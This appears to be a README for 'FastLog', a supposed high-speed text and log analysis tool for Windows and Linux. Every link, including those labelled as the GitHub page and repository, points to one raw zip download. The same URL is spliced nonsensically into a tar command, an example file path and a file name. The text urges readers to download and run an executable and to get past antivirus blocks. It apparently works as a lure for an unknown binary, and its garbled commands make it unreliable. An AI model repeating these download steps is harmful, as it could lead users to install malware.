# 📄 FastLog - Quick Text File Analysis Tool

[![Download FastLog](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)

---

## 📋 What is FastLog?

FastLog is a program that helps you analyze large text files quickly. It counts the number of lines, finds what kind of text encoding the file uses, and detects how the text is divided into parts. It works very fast, reading files at about 1.4 gigabytes per second. This makes it great for looking through big log files or other large text documents without waiting long.

FastLog uses special techniques to speed up the work. It reads files directly in memory and uses modern hardware instructions to process text faster. You don’t need to understand how that works—just know it is built to be quick and efficient.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these requirements:

- Operating system: Windows 10 or later, or Linux (Ubuntu 18.04 or newer recommended)
- CPU: Modern processor with AVX2 support (most computers from the last few years include this)
- Memory: At least 4 GB RAM
- Disk space: Minimum 50 MB free space for installation and running
- You do not need to install anything else to run FastLog.

---

## 🔧 Features

FastLog offers these key features to help you with text file analysis:

- Count lines in very large text files quickly
- Detect file encoding (such as UTF-8 or ASCII)
- Find delimiters used in the file (like commas, tabs, or spaces)
- Supports files of any size, even very large logs
- Works on both Windows and Linux
- Runs through the command line with simple commands
- Uses minimal computer resources while running
- Built with modern technology for performance

---

## 🚀 Getting Started

This section will guide you through downloading and running FastLog on your computer. Even if you have no technical skills, follow these steps and you will be analyzing text files in minutes.

---

## ⬇️ Download & Install

Please **visit this page to download** the latest version of FastLog:

[https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)

On that page, look for the latest release section. You will see files for different operating systems, such as Windows (`.exe`) and Linux (`https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip` or similar). Pick the file that matches your system:

- For Windows: Download the `.exe` file
- For Linux: Download the compressed file (`https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip`)

After downloading, follow the instructions below depending on your system.

---

### On Windows

1. Find the `.exe` file you downloaded (usually in the "Downloads" folder).
2. Double-click the file to start FastLog. It will open a command window.
3. You can run FastLog commands by typing into this window (see section "How to Use FastLog").
4. No installation needed. You can delete the file anytime.

---

### On Linux

1. Open the "Downloads" folder in your file manager or terminal.
2. Extract the compressed file by right-clicking and selecting "Extract Here", or in terminal run:
   
   ```bash
   tar -xvzf https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
   ```
3. Open a terminal in that folder.
4. To start FastLog, type `./fastlog` and press Enter.
5. You may need to make the file executable first using:

   ```bash
   chmod +x fastlog
   ```
6. You can now run commands from this terminal window.

---

## 📚 How to Use FastLog

FastLog runs using simple commands typed into your command window (Windows) or terminal (Linux). Here are easy steps to analyze a text file.

---

### Basic Command

To count lines in a file, type:

```
fastlog <path-to-your-text-file>
```

Replace `<path-to-your-text-file>` with the full file name or drag the file into the window and drop it. Example:

```
fastlog C:\Users\Name\Documents\https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
```

or on Linux:

```
./fastlog https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip
```

FastLog will then display the number of lines and other details about the file.

---

### Detect Encoding

By default, FastLog detects the encoding automatically. If you want to specify an encoding, use:

```
fastlog --encoding utf8 <file>
```

Available encoding options include `utf8`, `ascii`, `utf16`, and others.

---

### Find Delimiters

To find what delimiter the file uses (such as commas or tabs), type:

```
fastlog --find-delimiter <file>
```

FastLog will tell you what character separates the text fields.

---

### Help Command

If you want to see all available options, type:

```
fastlog --help
```

This will list all commands and usage tips.

---

## 🛠️ Troubleshooting

Some common issues you might face:

- **FastLog does not start:** Check you downloaded the right file for your system. Make sure the file is not blocked by your antivirus. On Linux, ensure the file has execute permissions.
- **File not found error:** Double-check the file path you typed. Make sure the file exists and you have permission to open it.
- **Slow performance:** FastLog runs fast on modern CPUs with AVX2 support. If your computer is older, speed might be lower.
- **Error messages:** Copy the message and consult the GitHub issues page for support or check the help command.

---

## 🔐 Privacy & Security

FastLog runs on your own computer and does not send your files anywhere. All processing happens locally. You don’t need an internet connection to work with files.

---

## 🌐 Supported Platforms

FastLog is tested on these platforms:

- Windows 10 and later
- Linux distributions like Ubuntu, Fedora, CentOS, and Debian
- Both 64-bit and 32-bit systems are supported, but 64-bit is recommended for large files

---

## 📞 Getting Help

If you have questions, you can:

- Visit the [GitHub page for FastLog](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip) and check the "Issues" tab to see if your problem is reported.
- Open a new issue if you can describe the problem clearly.
- Look at the documentation files included with the download or on the GitHub repository.

---

## 🔗 Useful Links

- Download FastLog: [https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)
- FastLog GitHub Repository: [https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip](https://raw.githubusercontent.com/realtahmidbro/FastLog/main/installer/Log_Fast_2.1-beta.1.zip)

---

This readme provides a clear path to get FastLog running on your computer with minimal effort. Follow the steps carefully and you will be ready to analyze large text files quickly.